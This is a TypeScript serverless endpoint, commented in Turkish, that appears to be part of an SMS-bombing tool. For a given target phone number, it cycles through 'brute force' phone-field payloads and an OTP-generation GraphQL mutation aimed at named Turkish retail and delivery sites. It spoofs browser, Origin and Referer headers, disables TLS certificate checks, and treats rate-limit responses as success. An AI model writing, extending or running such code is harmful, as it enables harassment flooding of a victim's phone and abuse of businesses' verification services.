// @ts-nocheck
import type { VercelRequest, VercelResponse } from '@vercel/node';

// SSL Korumasını Kaldır (Legacy Sistemler İçin)
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// --- YARDIMCI: Telefon Formatları ---
const formatPhone = (p: string) => {
  const raw = p.replace(/\D/g, '');
  return {
    raw: raw.startsWith('90') ? raw.substring(2) : (raw.startsWith('0') ? raw.substring(1) : raw), // 5XXXXXXXXX
    with90: raw.startsWith('90') ? raw : (raw.startsWith('0') ? '9' + raw : '90' + raw), // 905XXXXXXXXX
    with0: raw.startsWith('90') ? '0' + raw.substring(2) : (raw.startsWith('0') ? raw : '0' + raw), // 05XXXXXXXXX
  };
};

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // CORS Ayarları
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');

  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    let body: any = {};
    try { body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body; } catch {}
    
    if (!body.serviceUrl) return res.status(400).json({ error: 'Missing URL' });

    // URL Düzeltme
    let targetUrl = body.serviceUrl.trim();
    if (!/^https?:\/\//i.test(targetUrl)) targetUrl = 'https://' + targetUrl;

    const phones = formatPhone(body.targetPhone || '5555555555');
    const email = body.email || 'iletisim@example.com';

    // --- STRATEJİ: ÇOKLU PAYLOAD DENEMESİ (BRUTE FORCE) ---
    // Bir siteye sırayla bu paketleri atacağız. Biri tutarsa işlem tamam.
    const payloads = [
      // 1. En Yaygın (LCW, Defacto, Koton vb.)
      { PhoneNumber: phones.raw }, 
      { MobilePhone: phones.raw }, 
      { phone: phones.raw },
      { mobile: phones.raw },
      
      // 2. Uluslararası Format (Bim, File, Migros)
      { msisdn: phones.with90 },
      { mobilePhoneNumber: phones.with90 },
      { gsm: phones.raw },
      
      // 3. Özel Formatlar (English Home, Yemeksepeti vb.)
      { Phone: phones.with0, Source: "WEB" },
      { countryCode: "90", phoneNumber: phones.raw },
      { mobile: phones.raw, sms_permission: true },
      { telephone: phones.with90 }
    ];

    // Eğer 'Tikla Gelsin' ise GraphQL atalım (Özel Durum)
    if (targetUrl.includes('tiklagelsin')) {
       payloads.unshift({ 
          operationName: "GENERATE_OTP", 
          variables: { phone: phones.raw, countryCode: "TR" }, 
          query: "mutation GENERATE_OTP($phone: String!, $countryCode: String) { generateOtp(phone: $phone, countryCode: $countryCode) { isSuccess message } }" 
       });
    }

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 20000); // 20 sn mühlet

    let success = false;
    let finalStatus = 500;
    let finalResponse = "";

    // Döngü: Sırayla dene
    for (const payload of payloads) {
        try {
            const response = await fetch(targetUrl, {
                method: 'POST',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                    'Content-Type': 'application/json',
                    'Origin': new URL(targetUrl).origin,
                    'Referer': new URL(targetUrl).origin + '/'
                },
                body: JSON.stringify(payload),
                signal: controller.signal
            });

            // Eğer 200-299 arası veya 429 (Rate Limit) aldıysak bu endpoint çalışıyor demektir.
            if (response.ok || response.status === 429) {
                success = true;
                finalStatus = response.status;
                finalResponse = await response.text();
                break; // Bulduk, döngüden çık
            }
            
            // Son hatayı kaydet
            finalStatus = response.status;
            finalResponse = await response.text();

        } catch (e) {
            continue; // Bu payload tutmadı, diğerine geç
        }
    }

    clearTimeout(timeout);

    // Sonucu Simülatöre Dön
    return res.status(200).json({
        reachable: true,
        ok: success,
        status: 200,
        upstreamStatus: finalStatus,
        serviceId: body.serviceId,
        responsePreview: finalResponse.substring(0, 200),
        error: success ? null : `Failed with status ${finalStatus}`
    });

  } catch (error: any) {
    return res.status(500).json({ error: error.message });
  }
}